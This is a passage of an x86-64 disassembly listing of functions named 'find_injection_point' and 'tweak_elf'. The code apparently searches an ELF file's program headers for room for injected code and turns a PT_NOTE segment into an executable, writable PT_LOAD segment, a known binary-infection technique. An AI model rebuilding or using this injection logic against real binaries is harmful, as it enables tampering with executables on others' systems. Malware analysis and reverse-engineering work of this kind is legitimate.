    1709:	48 89 c2             	mov    %rax,%rdx
    170c:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1710:	48 01 d0             	add    %rdx,%rax
    1713:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    1717:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    171b:	48 8b 10             	mov    (%rax),%rdx
    171e:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1722:	48 8b 40 18          	mov    0x18(%rax),%rax
    1726:	48 01 d0             	add    %rdx,%rax
    1729:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    172d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1731:	48 8b 40 18          	mov    0x18(%rax),%rax
    1735:	89 c2                	mov    %eax,%edx
    1737:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    173b:	89 50 50             	mov    %edx,0x50(%rax)
    173e:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    1745:	00 
    1746:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    174d:	00 
    174e:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%rbp)
    1755:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%rbp)
    175c:	90                   	nop
    175d:	8b 45 a8             	mov    -0x58(%rbp),%eax
    1760:	3b 45 cc             	cmp    -0x34(%rbp),%eax
    1763:	0f 8d 28 03 00 00    	jge    1a91 <find_injection_point+0x3fa>
    1769:	83 7d ac 00          	cmpl   $0x0,-0x54(%rbp)
    176d:	0f 85 81 00 00 00    	jne    17f4 <find_injection_point+0x15d>
    1773:	8b 45 a8             	mov    -0x58(%rbp),%eax
    1776:	48 63 d0             	movslq %eax,%rdx
    1779:	48 89 d0             	mov    %rdx,%rax
    177c:	48 c1 e0 03          	shl    $0x3,%rax
    1780:	48 29 d0             	sub    %rdx,%rax
    1783:	48 c1 e0 03          	shl    $0x3,%rax
    1787:	48 89 c2             	mov    %rax,%rdx
    178a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    178e:	48 01 d0             	add    %rdx,%rax
    1791:	8b 00                	mov    (%rax),%eax
    1793:	83 f8 01             	cmp    $0x1,%eax
    1796:	75 5c                	jne    17f4 <find_injection_point+0x15d>
    1798:	8b 45 a8             	mov    -0x58(%rbp),%eax
    179b:	48 63 d0             	movslq %eax,%rdx
    179e:	48 89 d0             	mov    %rdx,%rax
    17a1:	48 c1 e0 03          	shl    $0x3,%rax
    17a5:	48 29 d0             	sub    %rdx,%rax
    17a8:	48 c1 e0 03          	shl    $0x3,%rax
    17ac:	48 89 c2             	mov    %rax,%rdx
    17af:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    17b3:	48 01 d0             	add    %rdx,%rax
    17b6:	48 8b 40 10          	mov    0x10(%rax),%rax
    17ba:	89 c2                	mov    %eax,%edx
    17bc:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    17c0:	89 50 40             	mov    %edx,0x40(%rax)
    17c3:	8b 45 a8             	mov    -0x58(%rbp),%eax
    17c6:	48 63 d0             	movslq %eax,%rdx
    17c9:	48 89 d0             	mov    %rdx,%rax
    17cc:	48 c1 e0 03          	shl    $0x3,%rax
    17d0:	48 29 d0             	sub    %rdx,%rax
    17d3:	48 c1 e0 03          	shl    $0x3,%rax
    17d7:	48 89 c2             	mov    %rax,%rdx
    17da:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    17de:	48 01 d0             	add    %rdx,%rax
    17e1:	48 8b 50 30          	mov    0x30(%rax),%rdx
    17e5:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    17e9:	48 89 50 30          	mov    %rdx,0x30(%rax)
    17ed:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%rbp)
    17f4:	8b 45 a8             	mov    -0x58(%rbp),%eax
    17f7:	48 98                	cltq   
    17f9:	48 8d 50 01          	lea    0x1(%rax),%rdx
    17fd:	48 89 d0             	mov    %rdx,%rax
    1800:	48 c1 e0 03          	shl    $0x3,%rax
    1804:	48 29 d0             	sub    %rdx,%rax
    1807:	48 c1 e0 03          	shl    $0x3,%rax
    180b:	48 89 c2             	mov    %rax,%rdx
    180e:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1812:	48 01 d0             	add    %rdx,%rax
    1815:	48 8b 48 08          	mov    0x8(%rax),%rcx
    1819:	8b 45 a8             	mov    -0x58(%rbp),%eax
    181c:	48 63 d0             	movslq %eax,%rdx
    181f:	48 89 d0             	mov    %rdx,%rax
    1822:	48 c1 e0 03          	shl    $0x3,%rax
    1826:	48 29 d0             	sub    %rdx,%rax
    1829:	48 c1 e0 03          	shl    $0x3,%rax
    182d:	48 89 c2             	mov    %rax,%rdx
    1830:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1834:	48 01 d0             	add    %rdx,%rax
    1837:	48 8b 70 08          	mov    0x8(%rax),%rsi
    183b:	8b 45 a8             	mov    -0x58(%rbp),%eax
    183e:	48 63 d0             	movslq %eax,%rdx
    1841:	48 89 d0             	mov    %rdx,%rax
    1844:	48 c1 e0 03          	shl    $0x3,%rax
    1848:	48 29 d0             	sub    %rdx,%rax
    184b:	48 c1 e0 03          	shl    $0x3,%rax
    184f:	48 89 c2             	mov    %rax,%rdx
    1852:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1856:	48 01 d0             	add    %rdx,%rax
    1859:	48 8b 40 28          	mov    0x28(%rax),%rax
    185d:	48 01 f0             	add    %rsi,%rax
    1860:	48 29 c1             	sub    %rax,%rcx
    1863:	48 89 ca             	mov    %rcx,%rdx
    1866:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    186a:	48 8b 40 28          	mov    0x28(%rax),%rax
    186e:	48 39 c2             	cmp    %rax,%rdx
    1871:	0f 86 bb 00 00 00    	jbe    1932 <find_injection_point+0x29b>
    1877:	8b 45 a8             	mov    -0x58(%rbp),%eax
    187a:	48 63 d0             	movslq %eax,%rdx
    187d:	48 89 d0             	mov    %rdx,%rax
    1880:	48 c1 e0 03          	shl    $0x3,%rax
    1884:	48 29 d0             	sub    %rdx,%rax
    1887:	48 c1 e0 03          	shl    $0x3,%rax
    188b:	48 89 c2             	mov    %rax,%rdx
    188e:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1892:	48 01 d0             	add    %rdx,%rax
    1895:	48 8b 40 08          	mov    0x8(%rax),%rax
    1899:	48 89 c6             	mov    %rax,%rsi
    189c:	48 8d 05 c5 27 00 00 	lea    0x27c5(%rip),%rax        # 4068 <_IO_stdin_used+0x68>
    18a3:	48 89 c7             	mov    %rax,%rdi
    18a6:	b8 00 00 00 00       	mov    $0x0,%eax
    18ab:	ff 15 d7 46 00 00    	call   *0x46d7(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    18b1:	8b 45 a8             	mov    -0x58(%rbp),%eax
    18b4:	48 63 d0             	movslq %eax,%rdx
    18b7:	48 89 d0             	mov    %rdx,%rax
    18ba:	48 c1 e0 03          	shl    $0x3,%rax
    18be:	48 29 d0             	sub    %rdx,%rax
    18c1:	48 c1 e0 03          	shl    $0x3,%rax
    18c5:	48 89 c2             	mov    %rax,%rdx
    18c8:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    18cc:	48 01 d0             	add    %rdx,%rax
    18cf:	48 8b 40 08          	mov    0x8(%rax),%rax
    18d3:	89 c1                	mov    %eax,%ecx
    18d5:	8b 45 a8             	mov    -0x58(%rbp),%eax
    18d8:	48 63 d0             	movslq %eax,%rdx
    18db:	48 89 d0             	mov    %rdx,%rax
    18de:	48 c1 e0 03          	shl    $0x3,%rax
    18e2:	48 29 d0             	sub    %rdx,%rax
    18e5:	48 c1 e0 03          	shl    $0x3,%rax
    18e9:	48 89 c2             	mov    %rax,%rdx
    18ec:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    18f0:	48 01 d0             	add    %rdx,%rax
    18f3:	48 8b 40 28          	mov    0x28(%rax),%rax
    18f7:	8d 14 01             	lea    (%rcx,%rax,1),%edx
    18fa:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    18fe:	89 50 44             	mov    %edx,0x44(%rax)
    1901:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1905:	8b 50 40             	mov    0x40(%rax),%edx
    1908:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    190c:	8b 40 44             	mov    0x44(%rax),%eax
    190f:	01 c2                	add    %eax,%edx
    1911:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1915:	89 50 48             	mov    %edx,0x48(%rax)
    1918:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    191c:	c7 40 54 01 00 00 00 	movl   $0x1,0x54(%rax)
    1923:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1927:	8b 55 a8             	mov    -0x58(%rbp),%edx
    192a:	89 50 58             	mov    %edx,0x58(%rax)
    192d:	e9 60 01 00 00       	jmp    1a92 <find_injection_point+0x3fb>
    1932:	48 8d 05 57 27 00 00 	lea    0x2757(%rip),%rax        # 4090 <_IO_stdin_used+0x90>
    1939:	48 89 c7             	mov    %rax,%rdi
    193c:	ff 15 1e 46 00 00    	call   *0x461e(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    1942:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    1949:	e9 0b 01 00 00       	jmp    1a59 <find_injection_point+0x3c2>
    194e:	8b 45 ec             	mov    -0x14(%rbp),%eax
    1951:	48 98                	cltq   
    1953:	48 c1 e0 06          	shl    $0x6,%rax
    1957:	48 89 c2             	mov    %rax,%rdx
    195a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    195e:	48 01 d0             	add    %rdx,%rax
    1961:	8b 00                	mov    (%rax),%eax
    1963:	89 c2                	mov    %eax,%edx
    1965:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1969:	48 01 d0             	add    %rdx,%rax
    196c:	48 8d 15 59 27 00 00 	lea    0x2759(%rip),%rdx        # 40cc <_IO_stdin_used+0xcc>
    1973:	48 89 d6             	mov    %rdx,%rsi
    1976:	48 89 c7             	mov    %rax,%rdi
    1979:	ff 15 21 46 00 00    	call   *0x4621(%rip)        # 5fa0 <strcmp@GLIBC_2.2.5>
    197f:	85 c0                	test   %eax,%eax
    1981:	75 68                	jne    19eb <find_injection_point+0x354>
    1983:	8b 45 ec             	mov    -0x14(%rbp),%eax
    1986:	48 98                	cltq   
    1988:	48 c1 e0 06          	shl    $0x6,%rax
    198c:	48 89 c2             	mov    %rax,%rdx
    198f:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1993:	48 01 d0             	add    %rdx,%rax
    1996:	48 8b 40 18          	mov    0x18(%rax),%rax
    199a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    199e:	8b 45 ec             	mov    -0x14(%rbp),%eax
    19a1:	48 98                	cltq   
    19a3:	48 c1 e0 06          	shl    $0x6,%rax
    19a7:	48 89 c2             	mov    %rax,%rdx
    19aa:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    19ae:	48 01 d0             	add    %rdx,%rax
    19b1:	48 8b 40 20          	mov    0x20(%rax),%rax
    19b5:	48 01 45 f0          	add    %rax,-0x10(%rbp)
    19b9:	eb 05                	jmp    19c0 <find_injection_point+0x329>
    19bb:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    19c0:	8b 45 ec             	mov    -0x14(%rbp),%eax
    19c3:	48 98                	cltq   
    19c5:	48 c1 e0 06          	shl    $0x6,%rax
    19c9:	48 89 c2             	mov    %rax,%rdx
    19cc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    19d0:	48 01 d0             	add    %rdx,%rax
    19d3:	48 8b 48 30          	mov    0x30(%rax),%rcx
    19d7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    19db:	ba 00 00 00 00       	mov    $0x0,%edx
    19e0:	48 f7 f1             	div    %rcx
    19e3:	48 89 d0             	mov    %rdx,%rax
    19e6:	48 85 c0             	test   %rax,%rax
    19e9:	75 d0                	jne    19bb <find_injection_point+0x324>
    19eb:	8b 45 ec             	mov    -0x14(%rbp),%eax
    19ee:	48 98                	cltq   
    19f0:	48 c1 e0 06          	shl    $0x6,%rax
    19f4:	48 89 c2             	mov    %rax,%rdx
    19f7:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    19fb:	48 01 d0             	add    %rdx,%rax
    19fe:	48 8b 40 18          	mov    0x18(%rax),%rax
    1a02:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
    1a06:	73 4d                	jae    1a55 <find_injection_point+0x3be>
    1a08:	8b 45 ec             	mov    -0x14(%rbp),%eax
    1a0b:	48 98                	cltq   
    1a0d:	48 c1 e0 06          	shl    $0x6,%rax
    1a11:	48 89 c2             	mov    %rax,%rdx
    1a14:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1a18:	48 01 d0             	add    %rdx,%rax
    1a1b:	48 8b 40 18          	mov    0x18(%rax),%rax
    1a1f:	48 01 45 f0          	add    %rax,-0x10(%rbp)
    1a23:	eb 05                	jmp    1a2a <find_injection_point+0x393>
    1a25:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    1a2a:	8b 45 ec             	mov    -0x14(%rbp),%eax
    1a2d:	48 98                	cltq   
    1a2f:	48 c1 e0 06          	shl    $0x6,%rax
    1a33:	48 89 c2             	mov    %rax,%rdx
    1a36:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1a3a:	48 01 d0             	add    %rdx,%rax
    1a3d:	48 8b 48 30          	mov    0x30(%rax),%rcx
    1a41:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1a45:	ba 00 00 00 00       	mov    $0x0,%edx
    1a4a:	48 f7 f1             	div    %rcx
    1a4d:	48 89 d0             	mov    %rdx,%rax
    1a50:	48 85 c0             	test   %rax,%rax
    1a53:	75 d0                	jne    1a25 <find_injection_point+0x38e>
    1a55:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
    1a59:	8b 45 ec             	mov    -0x14(%rbp),%eax
    1a5c:	3b 45 dc             	cmp    -0x24(%rbp),%eax
    1a5f:	0f 8c e9 fe ff ff    	jl     194e <find_injection_point+0x2b7>
    1a65:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1a69:	89 c2                	mov    %eax,%edx
    1a6b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1a6f:	01 c2                	add    %eax,%edx
    1a71:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1a75:	89 50 44             	mov    %edx,0x44(%rax)
    1a78:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1a7c:	8b 50 40             	mov    0x40(%rax),%edx
    1a7f:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1a83:	8b 40 44             	mov    0x44(%rax),%eax
    1a86:	01 c2                	add    %eax,%edx
    1a88:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    1a8c:	89 50 48             	mov    %edx,0x48(%rax)
    1a8f:	eb 01                	jmp    1a92 <find_injection_point+0x3fb>
    1a91:	90                   	nop
    1a92:	90                   	nop
    1a93:	c9                   	leave  
    1a94:	c3                   	ret    

0000000000001a95 <tweak_elf>:
    1a95:	f3 0f 1e fa          	endbr64 
    1a99:	55                   	push   %rbp
    1a9a:	48 89 e5             	mov    %rsp,%rbp
    1a9d:	48 83 ec 50          	sub    $0x50,%rsp
    1aa1:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
    1aa5:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1aa9:	48 8b 40 10          	mov    0x10(%rax),%rax
    1aad:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1ab1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1ab5:	0f b7 40 3c          	movzwl 0x3c(%rax),%eax
    1ab9:	0f b7 c0             	movzwl %ax,%eax
    1abc:	89 45 ec             	mov    %eax,-0x14(%rbp)
    1abf:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1ac3:	48 8b 50 10          	mov    0x10(%rax),%rdx
    1ac7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1acb:	48 8b 40 28          	mov    0x28(%rax),%rax
    1acf:	48 01 d0             	add    %rdx,%rax
    1ad2:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    1ad6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1ada:	0f b7 40 38          	movzwl 0x38(%rax),%eax
    1ade:	0f b7 c0             	movzwl %ax,%eax
    1ae1:	89 45 dc             	mov    %eax,-0x24(%rbp)
    1ae4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1ae8:	48 8b 50 10          	mov    0x10(%rax),%rdx
    1aec:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1af0:	48 8b 40 20          	mov    0x20(%rax),%rax
    1af4:	48 01 d0             	add    %rdx,%rax
    1af7:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    1afb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1aff:	0f b7 40 3e          	movzwl 0x3e(%rax),%eax
    1b03:	0f b7 c0             	movzwl %ax,%eax
    1b06:	48 c1 e0 06          	shl    $0x6,%rax
    1b0a:	48 89 c2             	mov    %rax,%rdx
    1b0d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1b11:	48 01 d0             	add    %rdx,%rax
    1b14:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    1b18:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1b1c:	48 8b 50 10          	mov    0x10(%rax),%rdx
    1b20:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1b24:	48 8b 40 18          	mov    0x18(%rax),%rax
    1b28:	48 01 d0             	add    %rdx,%rax
    1b2b:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1b2f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1b33:	8b 40 54             	mov    0x54(%rax),%eax
    1b36:	83 f8 01             	cmp    $0x1,%eax
    1b39:	0f 85 de 00 00 00    	jne    1c1d <tweak_elf+0x188>
    1b3f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1b43:	8b 40 58             	mov    0x58(%rax),%eax
    1b46:	48 63 d0             	movslq %eax,%rdx
    1b49:	48 89 d0             	mov    %rdx,%rax
    1b4c:	48 c1 e0 03          	shl    $0x3,%rax
    1b50:	48 29 d0             	sub    %rdx,%rax
    1b53:	48 c1 e0 03          	shl    $0x3,%rax
    1b57:	48 89 c2             	mov    %rax,%rdx
    1b5a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1b5e:	48 01 d0             	add    %rdx,%rax
    1b61:	48 8b 70 20          	mov    0x20(%rax),%rsi
    1b65:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1b69:	48 8b 48 28          	mov    0x28(%rax),%rcx
    1b6d:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1b71:	8b 40 58             	mov    0x58(%rax),%eax
    1b74:	48 63 d0             	movslq %eax,%rdx
    1b77:	48 89 d0             	mov    %rdx,%rax
    1b7a:	48 c1 e0 03          	shl    $0x3,%rax
    1b7e:	48 29 d0             	sub    %rdx,%rax
    1b81:	48 c1 e0 03          	shl    $0x3,%rax
    1b85:	48 89 c2             	mov    %rax,%rdx
    1b88:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1b8c:	48 01 d0             	add    %rdx,%rax
    1b8f:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
    1b93:	48 89 50 20          	mov    %rdx,0x20(%rax)
    1b97:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1b9b:	8b 40 58             	mov    0x58(%rax),%eax
    1b9e:	48 63 d0             	movslq %eax,%rdx
    1ba1:	48 89 d0             	mov    %rdx,%rax
    1ba4:	48 c1 e0 03          	shl    $0x3,%rax
    1ba8:	48 29 d0             	sub    %rdx,%rax
    1bab:	48 c1 e0 03          	shl    $0x3,%rax
    1baf:	48 89 c2             	mov    %rax,%rdx
    1bb2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1bb6:	48 01 d0             	add    %rdx,%rax
    1bb9:	48 8b 70 28          	mov    0x28(%rax),%rsi
    1bbd:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1bc1:	48 8b 48 28          	mov    0x28(%rax),%rcx
    1bc5:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1bc9:	8b 40 58             	mov    0x58(%rax),%eax
    1bcc:	48 63 d0             	movslq %eax,%rdx
    1bcf:	48 89 d0             	mov    %rdx,%rax
    1bd2:	48 c1 e0 03          	shl    $0x3,%rax
    1bd6:	48 29 d0             	sub    %rdx,%rax
    1bd9:	48 c1 e0 03          	shl    $0x3,%rax
    1bdd:	48 89 c2             	mov    %rax,%rdx
    1be0:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1be4:	48 01 d0             	add    %rdx,%rax
    1be7:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
    1beb:	48 89 50 28          	mov    %rdx,0x28(%rax)
    1bef:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1bf3:	8b 40 58             	mov    0x58(%rax),%eax
    1bf6:	48 63 d0             	movslq %eax,%rdx
    1bf9:	48 89 d0             	mov    %rdx,%rax
    1bfc:	48 c1 e0 03          	shl    $0x3,%rax
    1c00:	48 29 d0             	sub    %rdx,%rax
    1c03:	48 c1 e0 03          	shl    $0x3,%rax
    1c07:	48 89 c2             	mov    %rax,%rdx
    1c0a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1c0e:	48 01 d0             	add    %rdx,%rax
    1c11:	c7 40 04 07 00 00 00 	movl   $0x7,0x4(%rax)
    1c18:	e9 1e 03 00 00       	jmp    1f3b <tweak_elf+0x4a6>
    1c1d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    1c24:	e9 b1 01 00 00       	jmp    1dda <tweak_elf+0x345>
    1c29:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1c2c:	48 63 d0             	movslq %eax,%rdx
    1c2f:	48 89 d0             	mov    %rdx,%rax
    1c32:	48 c1 e0 03          	shl    $0x3,%rax
    1c36:	48 29 d0             	sub    %rdx,%rax
    1c39:	48 c1 e0 03          	shl    $0x3,%rax
    1c3d:	48 89 c2             	mov    %rax,%rdx
    1c40:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1c44:	48 01 d0             	add    %rdx,%rax
    1c47:	8b 00                	mov    (%rax),%eax
    1c49:	83 f8 04             	cmp    $0x4,%eax
    1c4c:	0f 85 84 01 00 00    	jne    1dd6 <tweak_elf+0x341>
    1c52:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1c55:	48 63 d0             	movslq %eax,%rdx
    1c58:	48 89 d0             	mov    %rdx,%rax
    1c5b:	48 c1 e0 03          	shl    $0x3,%rax
    1c5f:	48 29 d0             	sub    %rdx,%rax
    1c62:	48 c1 e0 03          	shl    $0x3,%rax
    1c66:	48 89 c2             	mov    %rax,%rdx
    1c69:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1c6d:	48 01 d0             	add    %rdx,%rax
    1c70:	48 8b 40 08          	mov    0x8(%rax),%rax
    1c74:	48 89 c6             	mov    %rax,%rsi
    1c77:	48 8d 05 5a 24 00 00 	lea    0x245a(%rip),%rax        # 40d8 <_IO_stdin_used+0xd8>
    1c7e:	48 89 c7             	mov    %rax,%rdi
    1c81:	b8 00 00 00 00       	mov    $0x0,%eax
    1c86:	ff 15 fc 42 00 00    	call   *0x42fc(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    1c8c:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1c8f:	48 63 d0             	movslq %eax,%rdx
    1c92:	48 89 d0             	mov    %rdx,%rax
    1c95:	48 c1 e0 03          	shl    $0x3,%rax
    1c99:	48 29 d0             	sub    %rdx,%rax
    1c9c:	48 c1 e0 03          	shl    $0x3,%rax
    1ca0:	48 89 c2             	mov    %rax,%rdx
    1ca3:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1ca7:	48 01 d0             	add    %rdx,%rax
    1caa:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
    1cb0:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1cb4:	8b 48 44             	mov    0x44(%rax),%ecx
    1cb7:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1cba:	48 63 d0             	movslq %eax,%rdx
    1cbd:	48 89 d0             	mov    %rdx,%rax
    1cc0:	48 c1 e0 03          	shl    $0x3,%rax
    1cc4:	48 29 d0             	sub    %rdx,%rax
    1cc7:	48 c1 e0 03          	shl    $0x3,%rax
    1ccb:	48 89 c2             	mov    %rax,%rdx
    1cce:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1cd2:	48 01 d0             	add    %rdx,%rax
    1cd5:	89 ca                	mov    %ecx,%edx
    1cd7:	48 89 50 08          	mov    %rdx,0x8(%rax)
    1cdb:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1cdf:	8b 48 48             	mov    0x48(%rax),%ecx
    1ce2:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1ce5:	48 63 d0             	movslq %eax,%rdx
    1ce8:	48 89 d0             	mov    %rdx,%rax
    1ceb:	48 c1 e0 03          	shl    $0x3,%rax
    1cef:	48 29 d0             	sub    %rdx,%rax
    1cf2:	48 c1 e0 03          	shl    $0x3,%rax
    1cf6:	48 89 c2             	mov    %rax,%rdx
    1cf9:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1cfd:	48 01 d0             	add    %rdx,%rax
    1d00:	89 ca                	mov    %ecx,%edx
    1d02:	48 89 50 18          	mov    %rdx,0x18(%rax)
    1d06:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1d0a:	8b 48 48             	mov    0x48(%rax),%ecx
    1d0d:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1d10:	48 63 d0             	movslq %eax,%rdx
    1d13:	48 89 d0             	mov    %rdx,%rax
    1d16:	48 c1 e0 03          	shl    $0x3,%rax
    1d1a:	48 29 d0             	sub    %rdx,%rax
    1d1d:	48 c1 e0 03          	shl    $0x3,%rax
    1d21:	48 89 c2             	mov    %rax,%rdx
    1d24:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1d28:	48 01 d0             	add    %rdx,%rax
    1d2b:	89 ca                	mov    %ecx,%edx
    1d2d:	48 89 50 10          	mov    %rdx,0x10(%rax)
    1d31:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1d34:	48 63 d0             	movslq %eax,%rdx
    1d37:	48 89 d0             	mov    %rdx,%rax
    1d3a:	48 c1 e0 03          	shl    $0x3,%rax
    1d3e:	48 29 d0             	sub    %rdx,%rax
    1d41:	48 c1 e0 03          	shl    $0x3,%rax
    1d45:	48 89 c2             	mov    %rax,%rdx
    1d48:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1d4c:	48 01 c2             	add    %rax,%rdx
    1d4f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1d53:	48 8b 40 28          	mov    0x28(%rax),%rax
    1d57:	48 89 42 20          	mov    %rax,0x20(%rdx)
    1d5b:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1d5e:	48 63 d0             	movslq %eax,%rdx
    1d61:	48 89 d0             	mov    %rdx,%rax
    1d64:	48 c1 e0 03          	shl    $0x3,%rax
    1d68:	48 29 d0             	sub    %rdx,%rax
    1d6b:	48 c1 e0 03          	shl    $0x3,%rax
    1d6f:	48 89 c2             	mov    %rax,%rdx
    1d72:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1d76:	48 01 c2             	add    %rax,%rdx
    1d79:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1d7d:	48 8b 40 28          	mov    0x28(%rax),%rax
    1d81:	48 89 42 28          	mov    %rax,0x28(%rdx)
    1d85:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1d88:	48 63 d0             	movslq %eax,%rdx
    1d8b:	48 89 d0             	mov    %rdx,%rax
    1d8e:	48 c1 e0 03          	shl    $0x3,%rax
    1d92:	48 29 d0             	sub    %rdx,%rax
    1d95:	48 c1 e0 03          	shl    $0x3,%rax
    1d99:	48 89 c2             	mov    %rax,%rdx
    1d9c:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1da0:	48 01 d0             	add    %rdx,%rax
    1da3:	c7 40 04 07 00 00 00 	movl   $0x7,0x4(%rax)
    1daa:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1dad:	48 63 d0             	movslq %eax,%rdx
    1db0:	48 89 d0             	mov    %rdx,%rax
    1db3:	48 c1 e0 03          	shl    $0x3,%rax
    1db7:	48 29 d0             	sub    %rdx,%rax
    1dba:	48 c1 e0 03          	shl    $0x3,%rax
    1dbe:	48 89 c2             	mov    %rax,%rdx
    1dc1:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1dc5:	48 01 c2             	add    %rax,%rdx
    1dc8:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1dcc:	48 8b 40 30          	mov    0x30(%rax),%rax
    1dd0:	48 89 42 30          	mov    %rax,0x30(%rdx)
    1dd4:	eb 10                	jmp    1de6 <tweak_elf+0x351>
    1dd6:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
    1dda:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1ddd:	3b 45 dc             	cmp    -0x24(%rbp),%eax
    1de0:	0f 8c 43 fe ff ff    	jl     1c29 <tweak_elf+0x194>
    1de6:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
    1ded:	e9 3d 01 00 00       	jmp    1f2f <tweak_elf+0x49a>
    1df2:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1df5:	48 98                	cltq   
